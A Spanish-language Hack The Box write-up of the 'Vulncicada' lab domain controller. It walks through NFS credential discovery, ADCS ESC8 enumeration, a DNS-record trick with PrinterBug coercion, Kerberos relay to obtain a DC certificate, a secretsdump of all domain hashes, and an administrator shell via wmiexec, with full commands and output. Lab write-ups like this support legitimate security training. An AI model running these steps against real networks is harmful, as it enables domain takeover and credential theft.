---
tags:
permalink: /Vulncicada-HTB-Writeup
title: Vulncicada - Medium (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimineto 

```bash
nmap -sCV -p53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5985,9389,49664,49667,49826,49827,54070,54131,56392 10.129.100.199
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 19:00 -03
Nmap scan report for 10.129.100.199
Host is up (0.77s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-22 22:00:40Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-22T21:50:28
|_Not valid after:  2026-10-22T21:50:28
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-22T21:50:28
|_Not valid after:  2026-10-22T21:50:28
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-22T21:50:28
|_Not valid after:  2026-10-22T21:50:28
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-22T21:50:28
|_Not valid after:  2026-10-22T21:50:28
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-22T22:03:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2025-10-21T21:58:04
|_Not valid after:  2026-04-22T21:58:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49826/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49827/tcp open  msrpc         Microsoft Windows RPC
54070/tcp open  msrpc         Microsoft Windows RPC
54131/tcp open  msrpc         Microsoft Windows RPC
56392/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-22T22:02:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1069.26 seconds

```

### DNS / Port 53 

```bash
dig any @10.129.100.199 cicada.vl

; <<>> DiG 9.20.11-4+b1-Debian <<>> any @10.129.100.199 cicada.vl
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27683
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;cicada.vl.                     IN      ANY

;; ANSWER SECTION:
cicada.vl.              600     IN      A       10.129.100.199
cicada.vl.              3600    IN      NS      dc-jpq225.cicada.vl.
cicada.vl.              3600    IN      SOA     dc-jpq225.cicada.vl. hostmaster.cicada.vl. 233 900 600 86400 3600
cicada.vl.              600     IN      AAAA    dead:beef::d301:890a:d6e2:9c5c

;; ADDITIONAL SECTION:
dc-jpq225.cicada.vl.    3600    IN      A       10.129.100.199
dc-jpq225.cicada.vl.    3600    IN      AAAA    dead:beef::d301:890a:d6e2:9c5c

;; Query time: 8303 msec
;; SERVER: 10.129.100.199#53(10.129.100.199) (TCP)
;; WHEN: Wed Oct 22 19:27:45 -03 2025
;; MSG SIZE  rcvd: 197

```
## NFS / Port 2049

```bash
showmount -e 10.129.100.199
Export list for 10.129.100.199:
/profiles (everyone)
```
### Mount

Vemos que en el puerto 2049 hay una montura llamada `profiles`, por lo que con `mount` creamos la misma en un directorio temporal

```bash 
mkdir /tmp/montura
```

Y ahora creamos la montura para despues ver su contenido.

```bash
mount -t nfs 10.129.100.199:/profiles /tmp/montura
```

Visualizo el contenido, y vemos que son directorios de varios usuarios, pero dentro del directorio de` Rosie.Powell` encontré las siguientes credenciales en una imagen.

```bash
ls -la
total 10
drwxrwxrwx+  2 nobody nogroup 4096 Jun  3 07:21 .
drwxrwxrwt  24 root   root     560 Oct 22 19:09 ..
drwxrwxrwx+  2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx+  2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Shirley.West
```

![image-center](/assets/images/Pasted image 20251230145944.png)
## Auth as DC-JPQ225 

Ya que la imagen se encontró en el directorio de `Rosie.Powell` intentamos probar sin son validas a nivel de `kerberos` ya que parece que la autenticación `NTLM` esta deshabilitada.

```bash
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```
### Shares

Como vemos que si son validas probamos listar `shares`.

```bash
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
```
### Enumeration

Vemos un recurso que no es tan común así que vamos a conectarnos y ver su contenido.

```bash
impacket-smbclient cicada.vl/Rosie.Powell:Cicada123@DC-JPQ225.cicada.vl -dc-ip 10.129.100.199 -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares 
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL
# use certenroll
# ls
drw-rw-rw-          0  Wed Oct 22 19:04:14 2025 .
drw-rw-rw-          0  Fri Sep 13 12:17:59 2024 ..
<SNiP>
-rw-rw-rw-        331  Fri Sep 13 12:17:59 2024 nsrev_cicada-DC-JPQ225-CA.asp
```
### ADCS Enumeration

Vemos que dentro de `CertEnroll`, hay demasiados archivos de certificados, por lo que podriamos intentar ver si la maquina es vulnerable a algun `ESC`.

```bash
certipy-ad find -k -target-ip 10.129.100.199 -dc-host DC-JPQ225.cicada.vl  -vulnerable -dc-ip 10.129.100.199 -enabled -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 7EC011BD1A349395414FC8BF6DDA9F9C
    Certificate Validity Start          : 2025-10-22 21:54:05+00:00
    Certificate Validity End            : 2525-10-22 22:04:05+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```
### ESC8 

Como vemos la maquina es vulnerable a `ESC8` por lo que nos podemos ir directamente a la pagina de [certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) donde explican detalladamente  sobre como abusar de esta vulnerabilidad.
Para esto debido a que seguramente nos de errores debido a q esta vulnerabilidad es por la autenticación `NTLM` y en nuestro caso la maquina solo acepta la autenticación vía `Kerberos` primero necesitamos de crear un Servidor `DNS`. Para eso consultamos la `Machine Account quotta` de la maquina.

```bash
nxc ldap cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq          
LDAP        cicada.vl       389    DC-JPQ225        [*] None (name:DC-JPQ225) (domain:cicada.vl)
LDAP        cicada.vl       389    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
MAQ         cicada.vl       389    DC-JPQ225        [*] Getting the MachineAccountQuota
MAQ         cicada.vl       389    DC-JPQ225        MachineAccountQuota: 10
```
### ESC8 Abuse

Debido a q esta seteado a `10` podemos pasar a crear nuestro `DNS` como nos relata en este [enlace](https://github.com/decoder-it/KrbRelay-SMBServer) donde vemos que tiene que tener una sintaxis como este: _<server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA_ 
Para esto podemos hacer uso de [bloodyAD](https://github.com/CravateRouge/bloodyAD) 

```bash
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.16.66
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

Luego podemos configurar tal cual como dice en el [repo](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) de certipy podemos usar herramientas de coerción como `DFSCoerce` [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce), `PetitPotam` [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) , etc. en mi caso use la herramienta `netexec` con el modulo de coerción para realizar el ataque, de manera que este actúe de disparador para la autenticación `SMB`

```bash
 netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PrinterBug
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```

Y desde nuestra herramienta de retransmisión de Kerberos vemos que recibimos la conexión, y con ella, el certificado `.pfx`.

```bash
python3 krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.100.199
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD: Received connection from 10.129.100.199
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.100.199
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] GOT CERTIFICATE! ID 89
```

Una vez tenemos el certificado podemos usar el mismo `certipy` para autenticarnos con el certificado que obtuvimos.

```bash
certipy-ad auth -pfx DC-JPQ225.pfx -dc-ip 10.129.100.199
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

Una vez tenemos el hash de la maquina podemos solicitar un `TGT`, para luego poder usar `secretsdump` para dumpear los hashes de todos los usuarios del dominio.
## Shell as administrator

```bash
impacket-getTGT cicada.vl/dc-jpq225 -hashes aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3 -dc-ip 10.129.100.199
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in dc-jpq225.ccache
```
### Dump hashes with secretsdump

Y ahora con la herramienta de `impacket` realizamos el dumpeo.

```bash
impacket-secretsdump  -k -no-pass -dc-ip 10.129.100.199 dc-jpq225.cicada.vl
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
krbtgt:aes256-cts-hmac-sha1-96:ed5b82d607535668e59aa8deb651be5abb9f1da0d31fa81fd24f9890ac84693d
krbtgt:aes128-cts-hmac-sha1-96:9b7825f024f21e22e198e4aed70ff8ea
krbtgt:des-cbc-md5:2a768a9e2c983e31
cicada.vl\Shirley.West:aes256-cts-hmac-sha1-96:3f3657fb6f0d441680e9c5e0c104ef4005fa5e79b01bbeed47031b04a913f353
cicada.vl\Shirley.West:aes128-cts-hmac-sha1-96:cd16a8664de29a4e8bd9e8b492f3eef9
cicada.vl\Shirley.West:des-cbc-md5:abbf341664bafe76
cicada.vl\Jordan.Francis:aes256-cts-hmac-sha1-96:ec8aaa2c9432ed3b0d2834e4e24dc243ec8d77ec3488101e79d1b2cc1c2ee6ea
cicada.vl\Jordan.Francis:aes128-cts-hmac-sha1-96:0b551142246edc108a92913e46852404
cicada.vl\Jordan.Francis:des-cbc-md5:a2e53d6ea44ab6e9
cicada.vl\Jane.Carter:aes256-cts-hmac-sha1-96:bb04095d1884439b825a5606dd43aadfd2a8fad1386b3728b9bad582efd5d4aa
cicada.vl\Jane.Carter:aes128-cts-hmac-sha1-96:8a27618e7036a49fb6e371f2e7af649e
cicada.vl\Jane.Carter:des-cbc-md5:340eda8962cbadce
cicada.vl\Joyce.Andrews:aes256-cts-hmac-sha1-96:7ca8317638d429301dfbb88af701fadffbc106d31f79a4de7e8d35afbc2d30c4
cicada.vl\Joyce.Andrews:aes128-cts-hmac-sha1-96:6ec2495dea28c09cf636dd8b080012fd
cicada.vl\Joyce.Andrews:des-cbc-md5:6bf2b6f21fcda258
cicada.vl\Daniel.Marshall:aes256-cts-hmac-sha1-96:fcccb590bac0a888898461247fbb3ee28d282671d8491e0b0b83ac688c2a29d6
cicada.vl\Daniel.Marshall:aes128-cts-hmac-sha1-96:80a3b053500586eefd07d32fc03e3849
cicada.vl\Daniel.Marshall:des-cbc-md5:e0fbdcb3c7e9f154
cicada.vl\Rosie.Powell:aes256-cts-hmac-sha1-96:54de41137f8d37d4a6beac1638134dfefa73979041cae3ffc150ebcae470fce5
cicada.vl\Rosie.Powell:aes128-cts-hmac-sha1-96:d01b3b63a2cde0d1c5e9e0e4a55529a4
cicada.vl\Rosie.Powell:des-cbc-md5:6e70b9a41a677a94
cicada.vl\Megan.Simpson:aes256-cts-hmac-sha1-96:cdb94aaf5b15465371cbe42913d652fa7e2a2e43afc8dd8a17fee1d3f142da3b
cicada.vl\Megan.Simpson:aes128-cts-hmac-sha1-96:8fd3f86397ee83ed140a52bdfa321df0
cicada.vl\Megan.Simpson:des-cbc-md5:587032806b5d19b6
cicada.vl\Katie.Ward:aes256-cts-hmac-sha1-96:829effafe88a0a5e17c4ccf1840f277327309b2902aeccc36625ac51b8e936bc
cicada.vl\Katie.Ward:aes128-cts-hmac-sha1-96:585264bc071354147db5b677be13506b
cicada.vl\Katie.Ward:des-cbc-md5:01801aa2e5755898
cicada.vl\Richard.Gibbons:aes256-cts-hmac-sha1-96:3c3beb85ec35003399e37ae578b90ae7a65b4ec7305e0ac012dbeaaa41bcbe22
cicada.vl\Richard.Gibbons:aes128-cts-hmac-sha1-96:646557f4143182bda5618f95429f3a49
cicada.vl\Richard.Gibbons:des-cbc-md5:834a675bd058efd0
cicada.vl\Debra.Wright:aes256-cts-hmac-sha1-96:26409e8cc8f3240501db7319bd8d8a2077d6b955a8f673b9ccf7d9086d3aec62
cicada.vl\Debra.Wright:aes128-cts-hmac-sha1-96:6a289ddd9a1a2196b671b4bbff975629
cicada.vl\Debra.Wright:des-cbc-md5:f25eb6a4265413cb
DC-JPQ225$:aes256-cts-hmac-sha1-96:01e2f9943c6c0c3f010dde6dddcae89cc81158e4f1c017e6fc34f85538d892b1
DC-JPQ225$:aes128-cts-hmac-sha1-96:87efc91730d07d819f58b4996e3fa04c
DC-JPQ225$:des-cbc-md5:6df208855d40dfcb
[*] Cleaning up...
```
### Shell

Ahora como ya es rutina, solicitamos el `TGT` para administrator y luego para adentro de la maquina con `wmiexec`.

```bash
impacket-getTGT cicada.vl/administrator -hashes aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.100.199
```

Y ahora nos conectamos
```bash
impacket-wmiexec cicada.vl/administrator@dc-jpq225.cicada.vl -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.100.199 -k
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cicada\administrator
```

`~Happy Hacking.`

